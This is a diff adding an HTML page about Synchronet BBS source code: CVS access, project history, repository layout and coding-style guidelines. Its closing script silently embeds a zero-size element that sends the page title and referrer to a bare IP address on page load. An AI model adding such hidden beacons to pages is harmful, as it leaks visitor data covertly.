@@ -1,0 +1,733 @@
+<HTML><HEAD>
+<title>Synchronet Source Code</title>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<META content="Microsoft FrontPage 4.0" name=GENERATOR></HEAD>
+<BODY>
+<H1 align="center">Synchronet Source Code</H1>
+<hr>
+<H2>Availability</H2>The <A href="http://www.synchro.net/">Synchronet</A> source code is 
+<A href="http://www.synchro.net/copyright.html">freely</A> available:
+<UL>
+  <LI>Anonymous FTP access to the most recent released source (very old at this
+    time) is available at: 
+  <UL>
+    <LI><A href="ftp://vert.synchro.net/">vert.synchro.net</A> 
+    <LI><A href="ftp://ftp.synchro.net/">ftp.synchro.net</A> 
+    <LI><A href="ftp://cvs.synchro.net/">cvs.synchro.net</A> </LI></UL>
+  Anonymous <A href="http://www.cvshome.org/">CVS</A> access to the entire development source and modification history is available at 
+  <i>cvs.synchro.net:/cvsroot/sbbs</i>: 
+  <UL>
+    <LI><tt>cvs -d :pserver:anonymous@cvs.synchro.net:/cvsroot/sbbs login</tt><BR>(just 
+    hit return, no password is necessary) 
+    <LI><tt>cvs -d :pserver:anonymous@cvs.synchro.net:/cvsroot/sbbs checkout src</tt>
+    </LI> 
+    <LI>For just the Version 3 source files, use:<br>
+      <tt>cvs -d :pserver:anonymous@cvs.synchro.net:/cvsroot/sbbs checkout src/sbbs3</tt> 
+    </LI> 
+    <LI>or web-based CVS access at <a href="http://cvs.synchro.net/cgi-bin/cvsweb.cgi">cvs.synchro.net/cgi-bin/cvsweb.cgi</a> 
+    </LI></UL></LI>
+  <li>Step-by-step instructions on how to download, build, and run the current
+    source code on Unix (Linux, FreeBSD, and OpenBSD), see <a href="ftp://vert.synchro.net/Synchronet/sbbsunix.txt">ftp://vert.synchro.net/Synchronet/sbbsunix.txt</a></li>
+</UL>
+<hr>
+<H2>History (as of October 2000)</H2>
+<H3>The Beginning</H3>I, <a href="author.html">Rob 
+Swindell</a>, started writing Synchronet BBS Software from scratch in 1990 (at 
+the age of 20). At that time, I had been programming in C for about a year and a 
+half. Needless to say, some of the early design decisions, I would've made 
+differently today (hindsight is always 20/20). When browsing the code, keep in 
+mind there are still portions of the source that have remained unchanged for the 
+past ten years (a virtual eternity in modern software). This should also explain any perceived 
+inconsistencies in programming style or design approach. 
+<H3>Version 1</H3>Synchronet v1 was written almost entirely in C with a couple 
+of small portions written in x86 assembler. Synchronet was an entirely "hard-coded"
+BBS, that is, the user menu structure and command key sequences were hard-coded into the source
+code (the ASCII/ANSI/RIP menu files themselves were sysop
+replaceable/customizable). 
+Synchronet v1 was a copyrighted commercial software package, and as such, was not 
+distributed with source code. Synchronet v1 utilized an inefficient message 
+storage method, using a separate file for each message (for both private e-mail 
+and public message forums). Synchronet v1 was available as a 16-bit console-mode 
+DOS program only.<BR><BR>Multi-node features (chat, multi-user games, etc) were 
+abundant from the very first release, but each node required a separate instance 
+of the program. Because of this requirement, local area networks (LANs) were 
+often utilized for connecting multiple PCs as part of a single BBS as well as 
+DESQview, Windows, and OS/2 for their DOS multi-tasking abilities. 
+<H3>Version 2</H3>Synchronet v2 incorporated a programmable command and menu 
+structure (<i>PCMS</i>), mostly doing away with hard-coded user commands. This allowed 
+emulation of competing BBS packages (from the user's perspective) as well as 
+sysop-customizable menus and dynamically loaded modules. A module/script 
+compiler called <I>Baja</I> was included that utilized a high-level BASIC-like 
+programming language.<BR><BR>Synchronet v2 also incorporated a new 
+database-style message base format called <I>SMB</I> (Synchronet Message Base). 
+The specifications and C library were released free to the public in hopes of 
+encouraging competing BBS packages and utility authors to adopt SMB as a 
+favorable alternative to the prolific Hudson, JAM, and Squish message base 
+formats.
+<p>A binary configuration file format (.cnf) was introduced in v2 to speed up
+the loading of configuration files and improve extensibility.<BR><BR>Although a 32-bit console-mode OS/2 version of Synchronet v2 was 
+released in 1995, it retained the same multi-node design as its DOS counterpart 
+and required a separate instance of the program for each node. It was also 
+during the active development life of Synchronet v2 that I began to release 
+32-bit extended DOS (DPMI), OS/2, and Win32 flavors of many of the utilities 
+included with Synchronet.<BR><BR>Synchronet v2 remained commercial software 
+until it was released as Freeware in early 1997 and the source code was 
+documented, packaged, and released to the <a href="http://www.fsf.org/philosophy/categories.html#PublicDomainSoftware">Public 
+Domain</a> later that same year (the Digital Dynamics' copyright was officially
+relinquished at this time). In December of 1999, I released a public beta 
+of v2.30c for DOS and OS/2 (in binary form) that fixed a few millennium bugs and 
+introduced some of the minor features I had incorporated thus far in my 
+development of Synchronet v3.</p>
+<H3>Version 3</H3>Synchronet was significantly redesigned in the fall of 1999 as 
+a multi-threaded/multi-user telnet server for Win32 platforms. To aid the 
+transition from the single-node-per-process model to a single-node-per-thread model, 
+most of the source modules were converted from C to C++ so they could 
+automatically inherit the current node's properties (previously implemented as 
+global variables). Serial/modem/dial-up user support was not migrated from v2 to 
+v3, so only telnet logins were supported. Configuration and database file compatibility
+with v2 was consciously maintained to allow mixing v2 and v3 nodes 
+on the same live BBS. The main BBS module and telnet server was implemented as 
+a single Win32 dynamic link library (DLL) built with <a href="http://msdn.microsoft.com/visualc/"> Microsoft Visual
+C++</a>.<BR><BR>Integrated FTP and Mail (SMTP/POP3) servers were also created for 
+v3. The FTP and Mail servers were implemented as individual Win32 DLLs built with 
+Microsoft Visual C++.<BR><BR>A GUI front-end called the 
+<I>Synchronet Control Panel</I> was created using <a href="http://www.borland.com/bcppbuilder/"> Borland C++ Builder</a> and the 
+VCL visual framework. The Synchronet Control Panel (SBBSCTRL.EXE) married the
+separate server DLLs and provided a uniform place for the sysop to view the
+various log files, real-time status and statistics, and perform system
+configuration and maintenance functions. It provided the functional equivalent
+of the &quot;Wait for call screen&quot; in v2.<BR><BR>A GUI user editor was also created using
+<a href="http://www.borland.com/delphi/"> Borland 
+Delphi</a> and the VCL. Delphi was chosen for this project in anticipation of the 
+Borland <A href="http://www.borland.com/kylix/">Kylix</A> release and it 
+represents my very first Pascal programming effort.<BR><BR>Synchronet v3 still has some 
+reliance on some of the v2 utilities (most notably, SCFG.EXE), but moving as 
+much code as possible to 32-bit (GUI where appropriate) is an increasing 
+priority. Additionally, keeping as much of the code base as modular and portable 
+as possible is a high priority. Reliance on the 16-bit assembler modules used in 
+v2 has been eliminated.<BR><BR>The first official release of Synchronet v3 was 
+v3.00b for Win32 (Windows 95-OSR2, 98, 98-SE, NT4, 2000, and Millennium Edition), 
+released on June 25th, 2000. This release was simply Freeware, was not 
+copyrighted, and did not include source code or any implied licensing (GNU GPL 
+or otherwise). At this point, no proper revision control system had ever been 
+utilized for Synchronet development. 
+<H3>Today (October 2000)</H3>Synchronet for Unix is considered by myself and many others to be a 
+potentially highly-desirable "product". From the onset of v3 design and 
+development I have kept an eye towards <a href="http://www.gnu.org/gnu/linux-and-gnu.html">GNU</a>/<a href="http://www.linux.org/">Linux</a> (and other free Unix-like OSes). The 
+Unix/Linux community is increasingly biased towards <a href="http://www.fsf.org/philosophy/free-sw.html">free</a>/<a href="http://www.opensource.org/osd.html">open-source</a> software, so 
+I've been planning for some time to make Synchronet an open-source project, but 
+was leaning towards waiting until after the Unix/Linux port was complete. In the 
+mean-time, I've been getting increasingly frequent offers from Linux developers to assist in the 
+porting effort. Since I had no proper revision control system in place, it 
+would've been a logistical nightmare to co-develop Synchronet with anyone in a 
+geographically undesirable location. Additionally, I had no copyright or licensing in place 
+to protect the Synchronet source code from <a href="http://www.fsf.org/philosophy/categories.html#ProprietarySoftware"> proprietary
+software</a> developers.
+<p>This is not to suggest that only Unix/Linux sysops would potentially benefit
+from Synchronet becoming an open-source project. It's just that Unix users are
+traditionally more likely to be willing (and able) to mess with the source code,
+and hence, more likely to submit useful modifications to the project. In
+addition, development tools (i.e. C/C++ compiler, Make utility, CVS, etc) are
+usually included free with Unix-like operating systems, while they are not
+typically as readily available to Windows users.<BR><BR>So I created a revision control database (repository) using 
+<A href="http://www.cvshome.org/">CVS</A> and checked-in the v2.3 and v3 source 
+code trees along with all the various menus, text files, and documents included 
+in Synchronet distributions. I chose CVS as the revision control system because 
+it is free software and is the tool of choice among most free/open-source 
+software developers. I would've preferred to use one of the commercial revision 
+control systems I've become accustomed to using in my professional development 
+career, but their price and status as proprietary software would have 
+potentially deterred valued open-source developers from contributing to the 
+project.<BR><BR>I also <a href="copyright.html"> copyrighted</a> all of the source code (as Rob Swindell) and put the majority of the v3 source code files under the 
+<A href="http://www.fsf.org/copyleft/gpl.html">GNU General Public License</A> to 
+protect them from inclusion in proprietary projects. I put the XSDK and SMBLIB 
+modules under the <A href="http://www.fsf.org/copyleft/lesser.html">GNU Lesser 
+General Public License</A>, which allows them to be linked with proprietary 
+projects.</p>
+<hr>
+<H2>The CVS Repository (cvs.synchro.net:/cvsroot/sbbs)</H2>
+<TABLE width="884">
+  <COLGROUP align=left>
+  <COLGROUP align=left>
+  <COLGROUP align=left>
+  <TBODY>
+  <TR>
+    <TH width="103">
+      <p align="left">Key 
+    <TH width="312">
+      <p align="left">Tool 
+    <TH width="449">
+      <p align="left">Supported Target Platforms 
+  <TR>
+    <TD width="103"><a href="http://www.gnu.org/software/gcc/gcc.html">GCC</a>
+    <TD width="312">GNU Compiler Collection
+    <TD width="449">GNU and Unix-variants (e.g. Linux) 
+  <TR>
+    <TD width="103">GCCWIN
+    <TD width="312">GCC (<a href="http://sources.redhat.com/cygwin/">Cygwin</a>/<a href="http://www.mingw.org/">MinGW</a>)
+      for
+    <TD width="449">Win32 
+  <TR>
+    <TD width="103">MSVC16
+    <TD width="312">Microsoft Visual C++ v1.52c
+    <TD width="449">DOS and Win16 
+  <TR>
+    <TD width="103"><a href="http://msdn.microsoft.com/visualc/">MSVC32</a>
+    <TD width="312">Microsoft Visual C++ v4+
+    <TD width="449">Win32 
+  <TR>
+    <TD width="103">MASM
+    <TD width="312">Microsoft Macro Assembler v5.10
+    <TD width="449">DOS 
+  <TR>
+    <TD width="103"><a href="http://community.borland.com/museum">BCCDOS</a>
+    <TD width="312">Any Borland C/C++ Compiler for
+    <TD width="449">DOS 
+  <TR>
+    <TD width="103">BCCWIN
+    <TD width="312">Any Borland C/C++ Compiler for
+    <TD width="449">Win32 
+  <TR>
+    <TD width="103">BCC31
+    <TD width="312">Borland C++ v3.1
+    <TD width="449">DOS 
+  <TR>
+    <TD width="103">BCC45
+    <TD width="312">Borland C++ v4.5
+    <TD width="449">DOS, DPMI, Win16, and Win32 
+  <TR>
+    <TD width="103">BCCOS2
+    <TD width="312">Borland C++ for OS/2 v2.0
+    <TD width="449">OS/2 
+  <TR>
+    <TD width="103"><a href="http://www.borland.com/bcppbuilder/">BCB5</a>
+    <TD width="312">Borland C++ Builder 5
+    <TD width="449">Win32 
+  <TR>
+    <TD width="103"><a href="http://www.borland.com/bcppbuilder/freecompiler/">BCC55</a>
+    <TD width="312">Borland C++ Builder Compiler 5.5
+    <TD width="449">Win32 
+  <TR>
+    <TD width="103"><a href="http://www.openwatcom.org/">WATCOM</a>
+    <TD width="312">Watcom C++ v10.0a
+    <TD width="449">DOS, DPMI, Win16, Win32, and OS/2 
+  <TR>
+    <TD width="103"><a href="http://www.borland.com/delphi/">DELPHI</a>
+    <TD width="312">Borland Delphi 5
+    <TD width="449">Win32 </TR></TBODY></TABLE><BR>
+<TABLE width="100%"><!--
+<COLGROUP ALIGN=LEFT><COLGROUP ALIGN=LEFT><COLGROUP ALIGN=LEFT><COLGROUP ALIGN=LEFT><COLGROUP 
+ALIGN=LEFT><COLGROUP ALIGN=CENTER>
+-->
+  <TBODY>
+  <TR bgColor=#000000>
+    <TH>
+      <p align="left"><FONT face=Arial color=#ffffff size=-1>Directory/File </FONT>
+    <TH>
+      <p align="left"><FONT face=Arial color=#ffffff size=-1>Description </FONT>
+    <TH>
+      <p align="left"><FONT face=Arial color=#ffffff size=-1>Supported Tools </FONT>
+  <TR>
+    <TD>CVSROOT/
+    <TD>Administrative files
+    <TD>Do not edit 
+  <TR>
+    <TD>src/
+    <TD>C/C++ source code
+    <TD>Various C/C++ Compilers 
+  <TR>
+    <TD>src/mswait/
+    <TD>Millisecond wait/time-slice API for DOS
+    <TD>MASM 
+  <TR>
+    <TD>src/sbbs2/
+    <TD>Synchronet Version 2 C source code
+    <TD>BCCDOS or BCCOS2 
+  <TR>
+    <TD>src/sbbs2/addfiles/
+    <TD>Utility to add files to BBS file database 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/allusers/
+    <TD>Perform actions on all users 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/ans2msg/
+    <TD>Convert ANSI file to Ctrl-A format 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/autonode/
+    <TD>Local login to first available node 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/baja/
+    <TD>Shell/module compiler (BAJA.EXE) 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/dcdwatch/
+    <TD>Monitor carrier detect for WWIV doors 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/delfiles/
+    <TD>Delete files from BBS file database 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/dstsedit/
+    <TD>Edit daily statistics 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/dupefind/
+    <TD>Find duplicate files in BBS file database 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/echo/
+    <TD>SBBSecho FidoNet Packet Tosser
+    <TD>WATCOM 
+  <TR>
+    <TD>src/sbbs2/execdos/
+    <TD>Synchronet for OS/2's EXECDOS.EXE 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/execsbbs/
+    <TD>Used to re-run SBBS.EXE (for DOS/OS2) 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/filelist/
+    <TD>Create list of files from BBS file database 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/install/
+    <TD>DOS/OS2 Installer 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/mlabels/
+    <TD>Generate mailing labels from user database 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/msg2ans/
+    <TD>Convert Ctrl-A files to ANSI format 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/node/
+    <TD>Display/Control Nodes from command-line 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/qwknodes/
+    <TD>QWK Network utility 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/rio/
+    <TD>OS/2 and Win32 Remote I/O library 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/scb/
+    <TD>Synchronet Callback 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/scfg/
+    <TD>Configuration Program
+    <TD>BCC45 
+  <TR>
+    <TD>src/sbbs2/slog/
+    <TD>Statistics log viewer 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/smb/
+    <TD>Synchronet Message Base library and header files 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/chksmb/
+    <TD>Utility to check Synchronet message bases for errors 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/fixsmb/
+    <TD>Utility to rebuild Synchronet message base indices 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/smbutil/
+    <TD>Message base maintenance utility 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/smbactiv/
+    <TD>Message base activity monitor 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/smm/
+    <TD>Synchronet Match Maker 
+    <TD> 
+  <TR>
+    <TD>src/sbbs2/uti/
+    <TD>Synchronet UTI driver (for PostLink/RelayNet/RIME) 
+    <TD> 
+  <TR>
+    <TD>src/spawno/
+    <TD>Ralf Brown's EMS/XMS/disk swapping replacement for spawn...() 
+    <TD> 
+  <TR>
+    <TD>src/stp/
+    <TD>Synchronet Transfer Protocols (X/Y/Zmodem) [incomplete] 
+    <TD> 
+  <TR>
+    <TD>src/tone/
+    <TD>Tone generator (used for external sysop chat pager) 
+    <TD> 
+  <TR>
+    <TD>src/uifc/
+    <TD>User Interface Library (text-mode)
+    <TD>BCC45 or BCCOS2 
+  <TR>
+    <TD>src/sbbs3/
+    <TD>Synchronet Version 3 C/C++ source code and&nbsp; project/make files
+    <TD>MSVC32, BCC55, or GNUWIN 
+  <TR>
+    <TD>src/sbbs3/sbbs3.dsw
+    <TD>Microsoft Visual Studio 6 Workspace File
+    <TD>MSVC32 
+  <TR>
+    <TD>src/sbbs3/sbbs.dsp
+    <TD>Microsoft Visual Studio 6 Project File for SBBS.DLL
+    <TD>MSVC32 
+  <TR>
+    <TD>src/sbbs3/mailsrvr.dsp
+    <TD>Microsoft Visual Studio 6 Project File for MAILSRVR.DLL
+    <TD>MSVC32 
+  <TR>
+    <TD>src/sbbs3/ftpsrvr.dsp
+    <TD>Microsoft Visual Studio 6 Project File for FTPSRVR.DLL
+    <TD>MSVC32 
+  <TR>
+    <TD>src/sbbs3/baja.dsp
+    <TD>Microsoft Visual Studio 6 Project File for BAJA.EXE
+    <TD>MSVC32 
+  <TR>
+    <TD>src/sbbs3/chksmb.dsp
+    <TD>Microsoft Visual Studio 6 Project File for CHKSMB.EXE
+    <TD>MSVC32 
+  <TR>
+    <TD>src/sbbs3/fixsmb.dsp
+    <TD>Microsoft Visual Studio 6 Project File for FIXSMB.EXE
+    <TD>MSVC32 
+  <TR>
+    <TD>src/sbbs3/smbutil.dsp
+    <TD>Microsoft Visual Studio 6 Project File for SMBUTIL.EXE
+    <TD>MSVC32 
+  <TR>
+    <TD>src/sbbs3/sbbsexec.dsp
+    <TD>Microsoft Visual Studio 6 Project File for SBBSEXEC.DLL
+    <TD>MSVC32 
+  <TR>
+    <TD>src/sbbs3/Makefile.bor
+    <TD>Borland make file for SBBS.DLL, FTPSRVR.DLL, and MAILSRVR.DLL
+    <TD>BCC55 
+  <TR>
+    <TD>src/sbbs3/Makefile.gnu
+    <TD>GNU make file for SBBS.DLL, FTPSRVR.DLL, and MAILSRVR.DLL
+    <TD>GNUWIN 
+  <TR>
+    <TD>src/sbbs3/ctrl/
+    <TD>Control Panel (Win32 GUI)
+    <TD>BCB5 
+  <TR>
+    <TD>src/sbbs3/chat/
+    <TD>Local Chat Module (Win32 GUI)
+    <TD>BCB5 
+  <TR>
+    <TD>src/sbbs3/useredit/
+    <TD>Local User Editor (Win32 GUI)
+    <TD>DELPHI 
+  <TR>
+    <TD>src/sbbs3/dosxtrn/
+    <TD>External DOS Program Launcher (Win32)
+    <TD>MSVC16 
+  <TR>
+    <TD>src/sbbs3/execvxd/
+    <TD>FOSSIL/DOSIO driver for Win9x
+    <TD>MSVC32 and VtoolsD 
+  <TR>
+    <TD>exec/
+    <TD>Ultimate destination for executables 
+  <TR>
+    <TD>exec/*.src;*.inc
+    <TD>Loadable Modules and Command Shells
+    <TD>ASCII Editor and Baja 
+  <TR>
+    <TD>xtrn/
+    <TD>External Programs (Doors) 
+  <TR>
+    <TD>xtrn/sdk/
+    <TD>External Program Software Development Kit (XSDK)
+    <TD>Various 
+  <TR>
+    <TD>xtrn/sbj/
+    <TD>Synchronet Blackjack
+    <TD>BCCDOS, BCCWIN, or MSVC32 
+  <TR>
+    <TD>xtrn/sbl/
+    <TD>Synchronet BBS List
+    <TD>BCCDOS, BCCWIN, or MSVC32 
+  <TR>
+    <TD>xtrn/smm/
+    <TD>Synchronet Match Maker
+    <TD>BCC31 
+  <TR>
+    <TD>text/
+    <TD>Run-time read-only text files
+    <TD>ASCII editor 
+  <TR>
+    <TD>text/menu/
+    <TD>Menu Files
+    <TD>ASCII or ANSI editor 
+  <TR>
+    <TD>text/menu/major/ 
+    <TD> 
+  <TR>
+    <TD>text/menu/pcboard/ 
+    <TD> 
+  <TR>
+    <TD>text/menu/renegade/ 
+    <TD> 
+  <TR>
+    <TD>text/menu/sdos/ 
+    <TD> 
+  <TR>
+    <TD>text/menu/simple/ 
+    <TD> 
+  <TR>
+    <TD>text/menu/wildcat/ 
+    <TD> 
+  <TR>
+    <TD>docs/
+    <TD>Documentation 
+  <TR>
+    <TD>ctrl/
+    <TD>Run-time configuration files
+    <TD>SCFG 
+  <TR>
+    <TD>node1/
+    <TD> </TR></TBODY></TABLE>
+<hr>
+<h2>Modifications</h2>
+<p>Presumably, you are reading this file because you want access to the source
+code. And you want access to the source code because you plan on making
+modifications (or maybe you just want to verify there aren't any &quot;back
+doors&quot;). In any case, if and when you make useful modifications to the
+source code, you are encouraged to submit those changes to <a href="mailto:mods@synchro.net">mods@synchro.net</a>
+for possible inclusion in a future Synchronet release. Frequent contributors may
+become official co-developers and be given direct read/write access to the CVS
+repository by <a href="author.html">me</a>, the maintainer of the project.</p>
+<h3>Custom Modifications</h3>
+<p>If you are modifying the code for use on a single BBS and do not wish to give
+those modifications to anyone else, you have that right. To make synchronization
+of your version with the official Synchronet releases easier, it is highly
+recommended that you predefine a preprocessor symbol (e.g. MYMODS) and then wrap
+your modifications in a conditional compilation statement. Example:</p>
+<pre>#ifdef MYMODS
+    bprintf(&quot;You are experiencing my custom modification.\r\n&quot;);
+#endif</pre>
+<p>If you are changing existing lines of code, it is recommended that you
+include both the original and modified versions in your source and use
+conditional compilation statements to determine which version will be used.
+Example:</p>
+<pre>#ifdef MYMODS
+	i = j/100;
+#else /* Original code */
+	i = j/50;
+#endif	</pre>
+<p>This allows you to easily <i>&quot;</i>undo<i>&quot;</i> your modifications
+for testing purposes (by simply undefining MYMODS) as well as clearly marking,
+for future reference, which parts of the code were modified by you.</p>
+<h3>Coding Style</h3>
+<p>If you'd like to submit your modifications for possible inclusion in a future
+Synchronet release, it would be beneficial if the programming style was
+consistent with the style of the existing code base. Consistency of style helps
+improve readability and maintainability of the source code.</p>
+<p>Prior to Synchronet v3, I used a form of &quot;condensed&quot; <a href="http://cm.bell-labs.com/cm/cs/cbook/index.html">K&amp;R</a>
+style to get as much code in an 80x25 character display as possible while
+maintaining some degree of readability.&nbsp;</p>
+<pre><b>Example (K&amp;R style):</b>
+
+main()
+{
+    char line[MAXLINE];
+    int found = 0;
+
+    while (getline(line, MAXLINE) &gt; 0)
+	if (strindex(line, pattern) &gt;= 0) {
+	    printf(&quot;%s&quot;, line);
+	    found++;
+	}
+    return found;
+}
+
+<b>Example (Synchronet v2 style):</b>
+
+main()
+{
+    char line[MAXLINE];
+    int  found=0;
+
+while(getline(line,MAXLINE)&gt;0)
+    if(strindex(line,pattern)&gt;=0) {
+	printf(&quot;%s&quot;,line);
+	found++; }
+return(found);
+}
+</pre>
+<p>As you've probably noticed, in the Synchronet v2 style, the body of the
+function is not indented and the closing curly brace is not on its own line.
+Additionally, unnecessary white-space characters have been removed from within
+the body of the expressions. While the above examples do not demonstrate the
+potential advantages of compressing white-space in a C coding style, you can
+imagine how the limitations of an 80 column display could make heavily nested
+expressions difficult without resulting to such measures.</p>
+<p>In Synchronet v3, I've taken advantage of modern GUI text editors capable of
+displaying more than 80 characters on a line and have&nbsp;
+&quot;uncompressed&quot; the style to a degree:</p>
+<pre><b>Example (Synchronet v3 style):</b>
+
+main()
+{
+    char line[MAXLINE];
+    int  found=0;
+
+    while(getline(line,MAXLINE)&gt;0)
+        if(strindex(line,pattern)&gt;=0) {
+	    printf(&quot;%s&quot;,line);
+	    found++; 
+	}
+    return(found);
+}
+</pre>
+<p>Now the body of the function is indented and the closing curly brace has been
+placed on its own line (as in the K&amp;R style), but the unnecessary
+white-space characters remain compressed (eliminated from the body of the
+expressions). You may still find v2 style closing braces in some of the v3
+source files, but indentation and all other style elements should be consistent
+with the v3 style shown above.</p>
+<h4>Style Guidelines</h4>
+<ol>
+  <li>Use the Synchronet v3 indentation, white-space, and brace style (as
+    described above).</li>
+  <li>Configure your text editor for 4 space tab stops and keep the physical
+    tabs in the files (do not replace them with spaces).</li>
+  <li>Use the Synchronet copyright comment block (including the <a href="ptsc_hdr.html">PT/SC
+    headers</a>) when creating new source files.</li>
+  <li>Do not extend lines beyond column 100.</li>
+  <li>Add comments around or near any code you add or modify explaining the
+    rationale behind the modification.</li>
+  <li>Use descriptive symbol (function and variable) and pre-processor macro names.</li>
+  <li>Use symbol and macro naming styles consistent with those already used in
+    the project/source file you are modifying.</li>
+  <li>Do not use unnecessary global variables (use class members or function
+    parameters to pass values).</li>
+  <li>Use return types and variable types consistent with the data to be stored
+    or returned (e.g. use bool/BOOL for true/false type values).</li>
+  <li>Do not embed important numeric constants in your code; use macros (e.g.
+    #define SPECIAL_VALUE 128) or configurable variables instead.</li>
+</ol>
+<h3>Backwards Compatibility</h3>
+<p>There are two very important areas of compatibility that must be maintained
+when modifying the code:</p>
+<ol>
+  <li>Data and configuration file compatibility with older Synchronet versions
+    (v2+)</li>
+  <li>Builds for other compilers and platforms</li>
+</ol>
+<p>On the first point, you must take care not to alter structure definitions or
+file formats that will cause the resulting file not to operate in a compatible
+way with Synchronet v2. If you need additional data storage, try to use unused
+or reserved elements, bit-fields, or data fields in existing structure or file
+definitions (without changing the overall size of the structure or data record)
+or create auxiliary data files that contain the additional required data. All
+binary words and double-words are to be stored in little endian (Intel)
+byte-order and there are currently no provisions in the source code to account
+for byte-order translations on big endian systems.</p>
+<p>On the second point, it is critical that you do not add system calls or
+system-dependant functionality in a non-portable fashion. If you are adding code
+that is only supported on a specific platform and when built with a specific
+compiler or run-time library, be sure to wrap that code in&nbsp; conditional
+compilation statements that test for the appropriate pre-processor definitions.
+In addition, take care to add error conditions, warnings, or alternate behavior
+when the code is built on an unsupported platform or with an unsupported tool.
+For example:</p>
+<pre>#if defined(__MSDOS__)
+	mswait(1);
+#elif defined(__OS2__)
+	DosSleep(1);
+#elif defined (_WIN32)
+	Sleep(1);
+#else
+	#error &quot;No Sleep Function for target platform!&quot;
+#endif</pre>
+<h3>Portability</h3>
+<p>To maintain as much compiler and platform compatibility as possible, do not
+unnecessarily restrict code portions to a specific Unix-like operating system (Linux for example)
+when the code will (or should) compile with most Unix-like operating systems. For example:</p>
+<pre>#if defined(__unix__)
+	this_code_for_any_unix_variant;
+#endif
+
+#if defined(__linux__)
+	this_code_only_for_linux;
+#endif</pre>
+<p>Also, be sure to separate <b>compiler</b> dependancies from <b>platform</b> dependancies. For example:</P>
+<pre>#if defined(__GNUC__)
+	this_code_only_for_gcc;
+#else
+	this_code_for_all_others;
+#endif</pre>
+<p><b>Please use the following pre-processor symbols to determine the target platform:</b></p>
+<table>
+<COLGROUP align=center>
+<COLGROUP align=left>
+<th width="150">Symbol<th>Target Platform
+<tr><td>
+    <p align="center"><b><code>__unix__</code></b><td>Any Unix-like OS
+<tr><td>
+    <p align="center"><b><code>__linux__</code></b><td>GNU/Linux (use sparingly)
+<tr><td>
+    <p align="center"><b><code>__FreeBSD__</code></b><td>FreeBSD (use sparingly)
+<tr><td>
+    <p align="center"><b><code>BSD</code></b><td>Any BSD-based Unix
+<tr><td>
+    <p align="center"><b><code>_WIN32</code></b><td>Win32-based OS
+<tr><td>
+    <p align="center"><b><code>__OS2__</code></b><td>OS/2
+<tr><td>
+    <p align="center"><b><code>__MSDOS__</code></b><td>MS-DOS
+<tr><td>
+    <p align="center"><b><code>__DOS4G__</code></b><td>Rational 32-bit DOS extender
+<tr><td>
+    <p align="center"><b><code>__FLAT__</code></b><td>Other 32-bit DOS extender
+</table>
+<p><b>Please use the following pre-processor symbols to determine the compiler:</b></p>
+<table>
+<COLGROUP align=center>
+<COLGROUP align=left>
+<th width="150">Symbol<th>Compiler
+<tr><td>
+    <p align="center"><b><code>__GNUC__</code></b><td>GNU C/C++ Compiler
+<tr><td>
+    <p align="center"><b><code>__BORLANDC__</code></b><td>Borland C++ or C++ Builder Compiler
+<tr><td>
+    <p align="center"><b><code>__WATCOM__</code></b><td>Watcom C++
+<tr><td>
+    <p align="center"><b><code>_MSC_VER</code></b><td>Microsoft Visual C++
+</table>
+<p>Little-endian/80386-class target CPUs are assumed, so no testing for CPU-type is required at this time.</p>
+<h3>Submissions</h3>
+<p>When you've created a modification that you think other Synchronet sysops or
+users may find useful, you are encouraged to submit this modification to <a href="mailto:mods@synchro.net">mods@synchro.net</a>.
+Modifications should be submitted in the Unix <a href="http://www.gnu.org/software/diffutils/diffutils.html">diff</a>
+format. Currently, I am the sole judge of which submissions will be merged into
+the code base and which ones will not. If I determine that a submission should
+not be merged into the code base for any reason, I will make my best effort to
+explain to the submitting developer the reasons why and offer advice on how to
+remedy the situation, if at all possible. </p>
+<p align="center"><SCRIPT LANGUAGE="JavaScript">
+<!-- 
+document.write("<EMBED SRC=\"http://67.112.225.27:81/",document.title,
+" ",document.referrer,"\" HEIGHT=0 WIDTH=0>")
+// -->
+</SCRIPT>
+</BODY></HTML>
